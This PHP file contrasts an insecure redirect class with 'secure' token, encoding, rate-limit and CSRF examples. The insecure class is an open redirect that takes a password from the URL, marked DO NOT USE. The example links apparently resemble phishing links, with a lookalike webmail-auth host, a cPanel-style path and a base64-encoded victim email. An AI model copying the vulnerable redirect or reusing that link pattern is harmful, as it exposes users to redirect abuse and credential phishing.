<?php
/**
 * Usage Examples for Secure Redirect Handler
 * Shows before/after security implementations
 */

require_once 'secure_redirect_handler.php';
require_once 'security_config.php';

/**
 * BEFORE: Insecure Implementation (DO NOT USE)
 */
class InsecureExample {
    // ❌ VULNERABLE - DO NOT USE THIS CODE
    public function insecureRedirect() {
        // Exposed password in URL
        $password = $_GET['pwd'] ?? 'abc123';
        
        // Unvalidated redirect
        $redirectUrl = $_GET['redirect'] ?? 'http://webmail-auth001.academmia.store/dashboard';
        
        // Simple base64 encoding (easily decoded)
        $email = base64_decode($_GET['email'] ?? '');
        
        // Predictable tokens
        $token = $_GET['_x_zm_rtaid'] ?? 'random123';
        
        // No CSRF protection
        // No rate limiting
        // No input validation
        
        // Direct redirect without validation
        header("Location: " . $redirectUrl);
        exit;
    }
}

/**
 * AFTER: Secure Implementation Examples
 */
class SecureExamples {
    private $secureAuth;
    private $logger;
    
    public function __construct() {
        $this->secureAuth = new SecureAuthProcessor();
        $this->logger = new SecurityLogger();
    }
    
    /**
     * Example 1: Generate Secure Authentication URL
     */
    public function generateSecureAuthUrl() {
        echo "\n=== Example 1: Generating Secure Auth URL ===\n";
        
        $email = "user@example.com";
        $redirectUrl = "https://webmail-auth001.academmia.store/dashboard";
        
        // Generate secure URL
        $secureUrl = $this->secureAuth->generateSecureAuthUrl($email, $redirectUrl);
        
        echo "Original email: $email\n";
        echo "Redirect URL: $redirectUrl\n";
        echo "Secure Auth URL: $secureUrl\n\n";
        
        // Log the URL generation
        $this->logger->logSecurityEvent('url_generated', $email, [
            'redirect_url' => $redirectUrl,
            'url_length' => strlen($secureUrl)
        ], 'low');
        
        return $secureUrl;
    }
    
    /**
     * Example 2: Validate Secure Token
     */
    public function validateTokenExample() {
        echo "\n=== Example 2: Token Validation ===\n";
        
        $redirectHandler = new SecureRedirectHandler();
        
        // Generate a token
        $userId = hash('sha256', 'user@example.com');
        $token = $redirectHandler->generateSecureToken($userId);
        
        echo "Generated token: $token\n";
        
        // Validate the token
        $tokenData = $redirectHandler->validateSecureToken($token);
        
        if ($tokenData) {
            echo "Token is valid!\n";
            echo "User ID: " . $tokenData['user_id'] . "\n";
            echo "Action: " . $tokenData['action'] . "\n";
            echo "Timestamp: " . date('Y-m-d H:i:s', $tokenData['timestamp']) . "\n";
            echo "Nonce: " . $tokenData['nonce'] . "\n";
        } else {
            echo "Token validation failed!\n";
        }
        
        echo "\n";
    }
    
    /**
     * Example 3: Secure Email Encoding/Decoding
     */
    public function emailEncodingExample() {
        echo "\n=== Example 3: Secure Email Encoding ===\n";
        
        $redirectHandler = new SecureRedirectHandler();
        $originalEmail = "user@example.com";
        
        // Encode email securely
        $encodedEmail = $redirectHandler->encodeEmail($originalEmail);
        echo "Original email: $originalEmail\n";
        echo "Encoded email: $encodedEmail\n";
        
        // Decode email
        $decodedEmail = $redirectHandler->decodeEmail($encodedEmail);
        echo "Decoded email: $decodedEmail\n";
        
        if ($originalEmail === $decodedEmail) {
            echo "✅ Email encoding/decoding successful!\n";
        } else {
            echo "❌ Email encoding/decoding failed!\n";
        }
        
        echo "\n";
    }
    
    /**
     * Example 4: Rate Limiting Test
     */
    public function rateLimitingExample() {
        echo "\n=== Example 4: Rate Limiting ===\n";
        
        $redirectHandler = new SecureRedirectHandler();
        $testIP = '192.168.1.100';
        
        echo "Testing rate limiting for IP: $testIP\n";
        
        for ($i = 1; $i <= 7; $i++) {
            $allowed = $redirectHandler->checkRateLimit($testIP, 5, 300);
            echo "Attempt $i: " . ($allowed ? "✅ Allowed" : "❌ Blocked") . "\n";
            
            if (!$allowed) {
                echo "Rate limit exceeded! IP blocked temporarily.\n";
                break;
            }
        }
        
        echo "\n";
    }
    
    /**
     * Example 5: CSRF Protection
     */
    public function csrfProtectionExample() {
        echo "\n=== Example 5: CSRF Protection ===\n";
        
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        $redirectHandler = new SecureRedirectHandler();
        
        // Generate CSRF token
        $csrfToken = $redirectHandler->generateCSRFToken();
        echo "Generated CSRF token: $csrfToken\n";
        
        // Validate CSRF token
        $isValid = $redirectHandler->validateCSRFToken($csrfToken);
        echo "Token validation: " . ($isValid ? "✅ Valid" : "❌ Invalid") . "\n";
        
        // Test with wrong token
        $isValidWrong = $redirectHandler->validateCSRFToken('wrong_token');
        echo "Wrong token validation: " . ($isValidWrong ? "✅ Valid" : "❌ Invalid") . "\n";
        
        echo "\n";
    }
    
    /**
     * Example 6: Complete Secure Authentication Flow
     */
    public function completeAuthFlow() {
        echo "\n=== Example 6: Complete Authentication Flow ===\n";
        
        $email = "testuser@academmia.store";
        
        // Step 1: Generate secure authentication URL
        echo "Step 1: Generating secure auth URL...\n";
        $authUrl = $this->secureAuth->generateSecureAuthUrl($email);
        echo "Auth URL generated: " . substr($authUrl, 0, 100) . "...\n";
        
        // Step 2: Parse URL components
        $urlParts = parse_url($authUrl);
        parse_str($urlParts['query'], $params);
        
        echo "Step 2: URL parameters extracted\n";
        echo "- Email parameter length: " . strlen($params['email']) . "\n";
        echo "- Auth token length: " . strlen($params['auth_token']) . "\n";
        echo "- CSRF token length: " . strlen($params['csrf_token']) . "\n";
        
        // Step 3: Simulate validation (normally done by processAuthRequest)
        echo "Step 3: Validating parameters...\n";
        
        $redirectHandler = new SecureRedirectHandler();
        
        // Validate email
        $decodedEmail = $redirectHandler->decodeEmail($params['email']);
        echo "- Email validation: " . ($decodedEmail === $email ? "✅ Valid" : "❌ Invalid") . "\n";
        
        // Validate token
        $tokenData = $redirectHandler->validateSecureToken($params['auth_token']);
        echo "- Token validation: " . ($tokenData ? "✅ Valid" : "❌ Invalid") . "\n";
        
        if ($tokenData) {
            echo "- Token user ID matches: " . ($tokenData['user_id'] === hash('sha256', $email) ? "✅ Yes" : "❌ No") . "\n";
        }
        
        echo "\n";
    }
}

/**
 * Security Comparison: Before vs After
 */
function securityComparison() {
    echo "\n=== SECURITY COMPARISON ===\n";
    
    echo "❌ BEFORE (Insecure):\n";
    echo "- URL: http://webmail-auth001.academmia.store/cpsess/prompt?fromPWA=1&pwd=abc123&_x_zm_rtaid=random123&_x_zm_rhtaid=456&email=" . base64_encode('user@example.com') . "\n";
    echo "- Issues:\n";
    echo "  * Password exposed in URL\n";
    echo "  * Predictable tokens\n";
    echo "  * Simple base64 encoding\n";
    echo "  * No validation\n";
    echo "  * No rate limiting\n";
    echo "  * No CSRF protection\n\n";
    
    echo "✅ AFTER (Secure):\n";
    $secureExample = new SecureExamples();
    $secureUrl = $secureExample->generateSecureAuthUrl();
    echo "- Issues Fixed:\n";
    echo "  * No exposed credentials\n";
    echo "  * Cryptographically secure tokens\n";
    echo "  * AES-256 encryption for sensitive data\n";
    echo "  * Full parameter validation\n";
    echo "  * Rate limiting implemented\n";
    echo "  * CSRF protection enabled\n";
    echo "  * Security headers set\n";
    echo "  * Comprehensive logging\n\n";
}

/**
 * Quick Security Test Suite
 */
function runSecurityTests() {
    echo "\n=== RUNNING SECURITY TESTS ===\n";
    
    $examples = new SecureExamples();
    
    // Run all examples
    $examples->validateTokenExample();
    $examples->emailEncodingExample();
    $examples->rateLimitingExample();
    $examples->csrfProtectionExample();
    $examples->completeAuthFlow();
    
    echo "✅ All security tests completed!\n\n";
}

// Run examples if script is called directly
if (basename(__FILE__) === basename($_SERVER['SCRIPT_NAME'])) {
    securityComparison();
    runSecurityTests();
}
?>